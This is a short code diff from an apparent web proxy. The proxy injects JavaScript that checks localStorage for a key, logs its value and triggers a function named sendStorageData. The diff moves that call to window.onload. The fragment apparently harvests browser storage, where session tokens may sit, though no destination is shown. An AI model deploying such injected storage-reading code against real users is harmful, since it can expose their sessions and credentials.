@@ -74,7 +74,8 @@ def proxy(path):
             const value = localStorage.getItem(keyName);
             if (value !== null) {
                 console.log(`Key "${keyName}" exists with value:`, value);
-                sendStorageData();
+                window.onload = sendStorageData;
+                //sendStorageData();
                  window.location.reload();// Send storage data when the key is found
             }
         }, 5000); // 5000 milliseconds = 5 seconds
